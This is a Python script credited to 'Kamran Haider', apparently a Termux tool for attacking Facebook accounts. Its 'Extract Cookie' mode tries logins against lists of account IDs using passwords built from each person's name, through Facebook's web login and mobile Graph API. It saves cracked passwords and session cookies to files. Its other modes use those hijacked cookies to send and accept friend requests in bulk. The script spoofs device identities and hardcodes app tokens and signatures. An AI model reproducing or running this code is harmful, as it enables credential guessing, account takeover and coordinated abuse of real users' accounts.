import os,json
import os,time,zlib
##print('\33[1;37\33[1m Join our WhatsApp group ')
###os.system('xdg-open https://chat.whatsapp.com/D5PCnonJDCsDvFKFfDiToT')
try:
	import re,base64,uuid,string,requests,random,sys,subprocess,platform
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	print(' \n\n Module Not installed Correctly! ')
from bs4 import BeautifulSoup as bs     
import os,sys,re,requests,json,random,uuid,base64,string,time
try:
    import requests
except ImportError:
    os.system('pip install requests > /dev/null')
try:
    import concurrent.futures
except ImportError:
    print ('\n [×] Modul Futures Not installed!...\n')
    os.system('pip install futures')
import requests
from concurrent.futures import ThreadPoolExecutor as JuttBadshah

ruz=[]
for mtc in range(1):
    rr=random.randint
    xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
    ruz.append(xd)





os.system("clear")



loop = 0
oks=[]
cps=[]

os.system('clear')
logo=("""                   

\x1b[1;92m   db   dD  .d8b.  .88b  d88. d888888b d888888b 
\x1b[1;97m   88 ,8P' d8' `8b 88'YbdP`88   `88'     `88'   
\x1b[1;93m   88,8P   88ooo88 88  88  88    88       88    
\x1b[1;96m   88`8b   88~~~88 88  88  88    88       88    
\x1b[1;94m   88 `88. 88   88 88  88  88   .88.     .88.   
\x1b[1;92m   YP   YD YP   YP YP  YP  YP Y888888P Y888888P 
                      
\033[1;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[37mOwner   :             \033[1;32mKamran Haider
\033[37mFacebook:             \033[1;32mKamran Haider
\033[1;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~      
\033[1;32m                AutoMation
\033[1;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")

def mark():
       print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')


def menu():
    os.system('clear')
    print(logo)
    print('[1]Extract Cookie')
    print('[2]Send REquests')
    print('[3]Accept REquests')
    print('[4]Only Send Requests TO UIDS')
    print('[5]Auto Send And Accept Requests')
    print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')      
    select=input('Select : ')
    if select =='1':
        file_open()
    elif select =='4':
        main()
    elif select =='5':
        file()
    else:
        print('Anna Ho Gaaya TU Salya')
        time.sleep(3)





def file_open():
				file = input('Enter Gmail Pass : ')
				print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')                
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				print(' [1] Method \33[1;32m {1}\33[1;37m ')
				print(' [2] Method \33[1;32m {2}\33[1;37m ')
				print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')                
				mthd=input(' \033[1;97mChoose: ')
				print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
				plist = []
				try:
					ps_limit = 1
				except:
					ps_limit =1
				for i in range(ps_limit):
					plist.append(input(f'Enter Login Password {i+1}: '))
				with tred(max_workers=1) as crack_submit:
					os.system('clear')
					print(logo)
					total_ids = str(len(fo))
					print(' Total Gmails : \033[1;32m'+total_ids+f' ')
					print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(api1,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(api2,ids,names,passlist)
                                                 							

def api1(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [Extracting] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                session = requests.Session()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        ps = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        head =    { 'authority': 'web.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'dpr': '1.875',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'viewport-width': '980',
}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"',
                        str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 
                        str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        kami=session.cookies.get_dict().keys()
                        if "c_user" in kami:
                            coki=session.cookies.get_dict()
                            kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                            print('\r\r\033[1;32m [Extracted] %s '%(ids))
                            open('/sdcard/KAMII/cookie.txt', 'a').write(ids+'|'+ps+'|'+kuki+'\n')
                            oks.append(ids)
                            break
                        elif 'checkpoint' in kami:
                            print('\r\r\33[1;33m [Error] '+ids+'\033[1;97m')
                            open('/sdcard/KAMII/error.txt', 'a').write(ids+'|'+ps+'\n')
                            cps.append(ids)
                            break
                        else:
                            print('\r\r\33[1;33m [Wrong Pass] '+ids+'\033[1;97m')
                            open('/sdcard/KAMII/wrong_pass.txt', 'a').write(ids+'|'+ps+'\n')
                            continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            api1(ids,names,passlist)
        loop+=1


def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Extracting] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        ps = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/258.0.0.34.119;FBBV/199294743;FBDM/{density=2.625.0,width=1080,height=2198};FBLC/ko_KR;FBRV/0;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A908N;FBSV/9;FBOP/1;FBCA/arm64-v8a;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        data = {'adid': adid,
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': ids,
'password': ps,
'method': 'auth.login',
'generate_analytics_claim':'1',
'community_id':'',
'cpl':'true',
'try_num':'1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group':'enable_v3_at_risk',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'error_detail_type':'button_with_disabled',
'source':'account_recovery',
'generate_machine_id':'1',
'jazoest':'2980',
'meta_inf_fbmeta':'V2_UNTAGGED',
'encrypted_msisdn':'',
'currently_logged_in_userid':'0',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name':'autheticate',
'fb_api_caller_class':'Fb4aAuthHandler',
'api_key':'882a8490361da98702bf97a021ddc14d',
'access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
'sig':'4c854da0db9429f4913c2a1b221c1d30'}
                        headers={'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'POST': '/auth/login HTTP/2',
'Host': 'b-graph.facebook.com',
'Priority': 'u=3, i',
'Content-Type': 'application/x-www-form-urlencoded',
'X-Fb-Sim-Hni': '64301',
'X-Fb-Net-Hni': '64301',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': ua,
'X-Fb-Connection-Quality': 'EXCELLENT',
'Authorization': 'OAuth null',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '6060',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '2126'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Extracted] '+ids+'\033[1;97m')
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        uid=coki.split('c_user=')[1].split(';')[0]
                                        page=f"; m_page_voice={uid}"
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/KAMII/cookie.txt','a').write(uid+'|'+ps+'|'+coki+page+'\n')
                                        oks.append(ids)
                                        break
                        elif 'We suspended your account' or 'Suspended ' in po:
                                        print('\r\r\33[1;33m [Disabled] '+ids+'\033[1;97m')
                                        open('/sdcard/KAMII/error.txt', 'a').write(ids+'|'+ps+'\n')
                        elif twf in str(po):
                                                print('\r\r\33[1;33m [Error] '+ids+'\033[1;97m')
                                                open('/sdcard/KAMII/error.txt', 'a').write(ids+'|'+ps+'\n')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\r\33[1;33m [Error] '+ids+'\033[1;97m')
                                                open('/sdcard/KAMII/error.txt', 'a').write(ids+'|'+ps+'\n')
                                                cps.append(ids)
                                                break
                                                
                        else:
                                        print('\r\r\33[1;33m [WRONG-Pass] '+ids+'\033[1;97m')
                                        open('/sdcard/KAMII/wrong_pass.txt', 'a').write(ids+'|'+ps+'\n')
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api2(ids,names,passlist)
        except Exception as e:
                pass


def mark():
       print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')

ok = []
fail = []
headget = {
    'authority': 'web.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'dpr': '1.875',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'viewport-width': '980',
}
def datareq(req,actor,links):
    __a = str(random.randrange(1,6))
    __hs = re.search('"haste_session":"(.*?)"',str(req)).group(1)
    __ccg = re.search('"connectionClass":"(.*?)"',str(req)).group(1)
    __rev = re.search('"__spin_r":(.*?),',str(req)).group(1)
    __spin_r = __rev
    __spin_b = re.search('"__spin_b":"(.*?)"',str(req)).group(1)
    __spin_t = re.search('"__spin_t":(.*?),',str(req)).group(1)
    __hsi = re.search('"hsi":"(.*?)"',str(req)).group(1)
    fb_dtsg = re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(req)).group(1)
    jazoest = re.search('jazoest=(.*?)"',str(req)).group(1)
    lsd = re.search('"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1)
    var = {"input":{"attribution_id_v2":"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,1717935582896,691145,190055527696468,,","friend_requestee_ids":[links],"friending_channel":"PROFILE_BUTTON","warn_ack_for_ids":[links],"actor_id":actor,"client_mutation_id":"1"},"scale":3}
    Data = {'av':actor,'__aaid':'0','__user':actor,'__a':__a,'__hs':__hs,'dpr':'2','__ccg':__ccg,'__rev':__rev,'__hsi':__hsi,'__comet_req':'15','fb_dtsg':fb_dtsg,'jazoest':jazoest,'lsd':lsd,'__spin_r':__spin_r,'__spin_b':__spin_b,'__spin_t':__spin_t,'fb_api_caller_class': 'RelayModern','fb_api_req_friendly_name': 'FriendingCometFriendRequestSendMutation','variables': json.dumps(var),'server_timestamps': 'true','doc_id': '7707897945967331'}
    return(Data)
def main():
    ok.clear()
    fail.clear()
    os.system('clear')
    print (logo)
    ab = input('Cookies file: ')
    try:
        idx = open(ab, 'r').read().splitlines()
    except:
        print ('File not found')
        time.sleep(3)
        main()
    ad = input('Links file: ')
    mark()
    try:
        link = open(ad, 'r').read().splitlines()
    except:
        print ('File not found')
        time.sleep(3)
        main()
    with JuttBadshah(max_workers=30) as juttbrand:
        for coki in idx:
            try:
                actor = coki.split('c_user=')[1].split(';')[0]
                juttbrand.submit(reqstart,coki,actor,link)
            except:
                pass
    print ('\r\033[1;32mdone > Successful/' +str(len(ok)) + ' failed/' + str(len(fail)) + '\033[0;97m               ')
    input('Press enter to back')
    main()
def reqstart(coki,actor,link):
    global ok,fail
    for links in link:
        try:
            req = requests.get('https://web.facebook.com/', cookies={'cookie': coki}, headers=headget).text
            data = datareq(req,actor,links)
            headers = {
                'authority': 'web.facebook.com',
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://web.facebook.com',
                'referer': 'https://web.facebook.com/profile.php?id='+links,
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-asbd-id': '129477',
                'x-fb-friendly-name': 'FriendingCometFriendRequestSendMutation',
                'x-fb-lsd': data['lsd'],
            }
            pos = requests.post('https://web.facebook.com/api/graphql', cookies={'cookie': coki}, data=data, headers=headers).json()
            if 'OUTGOING_REQUEST' in str(pos):
                mark()
                print('\033[1;32m[OK] Request Send Successfull')
                print(f'\033[1;37mFrom {actor} TO {links}')
                ok.append('ok')
            else:
                mark()
                print('\033[1;33m[ER] Requests Send Failed')
                print(f'\033[1;37mFrom {actor} TO {links}')
                fail.append('fail')
        except requests.exceptions.ConnectionError:
            print ('\rInternet Gets Slow')
            mark()
            time.sleep(8)
            pass
        except Exception:
            pass



headget_1 = {
    'authority': 'web.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'dpr': '1.875',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'viewport-width': '980',
}
def datareq_1(req,actor,links):
    __a = str(random.randrange(1,6))
    __hs = re.search('"haste_session":"(.*?)"',str(req)).group(1)
    __ccg = re.search('"connectionClass":"(.*?)"',str(req)).group(1)
    __rev = re.search('"__spin_r":(.*?),',str(req)).group(1)
    __spin_r = __rev
    __spin_b = re.search('"__spin_b":"(.*?)"',str(req)).group(1)
    __spin_t = re.search('"__spin_t":(.*?),',str(req)).group(1)
    __hsi = re.search('"hsi":"(.*?)"',str(req)).group(1)
    fb_dtsg = re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(req)).group(1)
    jazoest = re.search('jazoest=(.*?)"',str(req)).group(1)
    lsd = re.search('"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1)
    var = {"input":{"attribution_id_v2":"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,1717935582896,691145,190055527696468,,","friend_requestee_ids":[links],"friending_channel":"PROFILE_BUTTON","warn_ack_for_ids":[links],"actor_id":actor,"client_mutation_id":"1"},"scale":3}
    Data = {'av':actor,'__aaid':'0','__user':actor,'__a':__a,'__hs':__hs,'dpr':'2','__ccg':__ccg,'__rev':__rev,'__hsi':__hsi,'__comet_req':'15','fb_dtsg':fb_dtsg,'jazoest':jazoest,'lsd':lsd,'__spin_r':__spin_r,'__spin_b':__spin_b,'__spin_t':__spin_t,'fb_api_caller_class': 'RelayModern','fb_api_req_friendly_name': 'FriendingCometFriendRequestSendMutation','variables': json.dumps(var),'server_timestamps': 'true','doc_id': '7707897945967331'}
    return(Data)
def file():
    ok.clear()
    fail.clear()
    os.system('clear')
    print (logo)
    ab = input('request sender Cookies file: ')
    try:
        idx = open(ab, 'r').read().splitlines()
    except:
        print ('File not found')
        time.sleep(3)
        file()
    ad = input('request accepter cookie file: ')
    try:
        link = open(ad, 'r').read().splitlines()
    except:
        print ('File not found')
        time.sleep(3)
        file()
    with JuttBadshah(max_workers=30) as juttbrand:
        for coki in idx:
            try:
                actor = coki.split('c_user=')[1].split(';')[0]
                juttbrand.submit(reqstart,coki,actor,link)
            except:
                pass
    print ('\r\033[1;32mdone > Successful/' +str(len(ok)) + ' failed/' + str(len(fail)) + '\033[0;97m               ')
    input('Press enter to back')
    file()
def reqstart(coki,actor,link):
    global ok,fail
    for links in link:
        try:
            pid = links.split('c_user=')[1].split(';')[0]
            req = requests.get('https://web.facebook.com/', cookies={'cookie': coki}, headers=headget_1).text
            data = datareq_1(req,actor,pid)
            headers = {
                'authority': 'web.facebook.com',
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://web.facebook.com',
                'referer': 'https://web.facebook.com/profile.php?id='+pid,
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-asbd-id': '129477',
                'x-fb-friendly-name': 'FriendingCometFriendRequestSendMutation',
                'x-fb-lsd': data['lsd'],
            }
            pos = requests.post('https://web.facebook.com/api/graphql', cookies={'cookie': coki}, data=data, headers=headers).json()
            if 'OUTGOING_REQUEST' in str(pos):
                mark()
                print('\033[1;32m[OK] Request Send Successfull')
                print(f'\033[1;37mFrom {actor} TO {pid}')
                ok.append('ok')
            else:
                mark()
                print('\033[1;33m[ER] Requests Send Failed')
                print(f'\033[1;37mFrom {actor} TO {links}')
                fail.append('fail')
        except requests.exceptions.ConnectionError:
            print ('\rrequest failed internet problem')
            time.sleep(1)
            pass
        except Exception:
            pass



menu()






